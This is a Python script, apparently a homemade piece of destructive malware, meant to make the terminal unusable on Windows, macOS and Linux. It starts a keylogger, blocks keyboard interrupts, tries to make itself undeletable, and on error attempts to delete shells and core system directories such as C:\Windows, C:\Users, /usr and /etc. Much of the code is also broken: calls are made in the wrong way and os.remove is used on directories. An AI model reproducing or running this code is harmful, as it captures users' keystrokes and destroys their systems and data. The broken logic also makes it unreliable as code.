import os
import platform
import keylogger
import background_runner
import test
import test1
import test2
import powershell
import mycmd
import terminal

# For Windows, you can use the following code to make the terminal unusable by deleting the cmd.exe and powershell.exe files. Please note that this is a destructive action and should be used with caution.

CURRENT_OS = platform.system()


def terminalDestroyer():

        while True:
                if CURRENT_OS == 'Windows':
                        try:
                                background_runner.run_in_background(terminal.start_terminal)
                                background_runner.run_in_background(mycmd.starter_cmd())
                                background_runner.run_in_background(powershell.start_powershell)
                                background_runner.run_in_background(keylogger.start_keylogger)
                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
                                background_runner.run_in_background(test.run_forever())
                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))
                        except Exception as e:
                                        print(f"An error occurred: {e}")
                                        os.remove("C:\\Windows\\System32\\cmd.exe")
                                        os.remove("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
                                        os.remove("C:\\Windows\\System32")
                                        os.remove("C:\\Windows")
                                        os.remove("C:\\Users")
                                        os.remove("C:\\program files")
                                        os.remove("C:\\program files (x86)")
                                        os.remove("C:\\")

                # For MacOS, you can use the following code to make the terminal unusable by deleting the Terminal.app file. Please note that this is a destructive action and should be used with caution.

                elif CURRENT_OS == 'Darwin':
                        try:
                                background_runner.run_in_background(terminal.start_terminal)
                                background_runner.run_in_background(mycmd.starter_cmd())
                                background_runner.run_in_background(powershell.start_powershell)
                                background_runner.run_in_background(keylogger.start_keylogger)
                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
                                background_runner.run_in_background(test.run_forever())
                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))

                        except Exception as e:
                                        print(f"An error occurred: {e}")
                                        os.remove("/Applications/Utilities/Terminal.app")
                                        os.remove("/Applications/Utilities")
                                        os.remove("/Applications")
                                        os.remove("/Users")
                                        os.remove("/System")
                                        os.remove("/Library")
                                        os.remove("/bin")
                                        os.remove("/sbin")
                                        os.remove("/usr")
                                        os.remove("/var")
                                        os.remove("/etc")
                                        os.remove("/root")


                # For Linux, you can use the following code to make the terminal unusable by deleting the bash executable. Please note that this is a destructive action and should be used with caution.

                elif CURRENT_OS == 'Linux':
                        try:
                                background_runner.run_in_background(terminal.start_terminal)
                                background_runner.run_in_background(mycmd.starter_cmd())
                                background_runner.run_in_background(powershell.start_powershell)
                                background_runner.run_in_background(keylogger.start_keylogger)
                                background_runner.run_in_background(test._suppress_keyboard_interrupt())
                                background_runner.run_in_background(test.run_forever())
                                background_runner.run_in_background(test1.make_file_undeletable("make_terminal_unusable.py"))
                                background_runner.run_in_background(test2.load_key("make_terminal_unusable.py"))

                        except Exception as e:
                                        print(f"An error occurred: {e}")
                                        os.remove("/root/terminal")
                                        os.remove("/bin/sh")
                                        os.remove("/bin/bash")
                                        os.remove("/bin")
                                        os.remove("/sbin")
                                        os.remove("/usr")
                                        os.remove("/var")
                                        os.remove("/etc")
                                        os.remove("/root")

                        finally : 
                                os.remove(CURRENT_OS)


                else:   print("Unsupported operating system.")


if __name__ == '__main__':
    background_runner.run_in_background(terminalDestroyer())